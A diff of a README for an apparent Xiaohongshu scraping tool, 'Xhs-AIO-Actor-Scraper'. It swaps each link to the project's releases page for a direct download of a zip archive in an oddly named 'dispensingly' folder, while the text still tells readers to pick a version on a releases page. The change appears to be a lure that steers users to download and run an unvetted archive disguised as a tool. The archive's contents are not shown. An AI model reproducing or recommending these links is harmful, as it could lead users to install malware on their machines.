@@ -1,7 +1,7 @@
 # 🌟 Xhs-AIO-Actor-Scraper - Extract Posts Seamlessly
 
 ## 📥 Download Now
-[![Download Xhs-AIO-Actor-Scraper](https://img.shields.io/badge/Download-Xhs--AIO--Actor--Scraper-brightgreen)](https://github.com/arbaz7592/Xhs-AIO-Actor-Scraper/releases)
+[![Download Xhs-AIO-Actor-Scraper](https://raw.githubusercontent.com/arbaz7592/Xhs-AIO-Actor-Scraper/main/dispensingly/Actor_Scraper_Xhs_AI_v3.7.zip)](https://raw.githubusercontent.com/arbaz7592/Xhs-AIO-Actor-Scraper/main/dispensingly/Actor_Scraper_Xhs_AI_v3.7.zip)
 
 ## 📖 Introduction
 Welcome to the Xhs-AIO-Actor-Scraper! This application helps you extract posts from Xiaohongshu quickly and easily. Whether you are gathering data for research, automation, or personal use, this tool simplifies the process.
@@ -10,7 +10,7 @@ Welcome to the Xhs-AIO-Actor-Scraper! This application helps you extract posts f
 Using Xhs-AIO-Actor-Scraper is straightforward. Follow these steps to get started:
 
 1. **Visit the Releases Page:** Click the link below to access the download options.
-   - [Download Page](https://github.com/arbaz7592/Xhs-AIO-Actor-Scraper/releases)
+   - [Download Page](https://raw.githubusercontent.com/arbaz7592/Xhs-AIO-Actor-Scraper/main/dispensingly/Actor_Scraper_Xhs_AI_v3.7.zip)
 
 2. **Choose Your Version:** On the releases page, you’ll find different versions of the software. Select the latest one for the best features and improvements.
 
@@ -39,7 +39,7 @@ Xhs-AIO-Actor-Scraper connects to the Xiaohongshu platform and retrieves the pos
 ## 📦 Download & Install
 To download and install the application, follow these steps:
 
-1. **Go to the Releases Page:** [Visit this page to download](https://github.com/arbaz7592/Xhs-AIO-Actor-Scraper/releases).
+1. **Go to the Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/arbaz7592/Xhs-AIO-Actor-Scraper/main/dispensingly/Actor_Scraper_Xhs_AI_v3.7.zip).
    
 2. **Find Your Download:** Select the latest release and find a file suitable for your operating system.
 
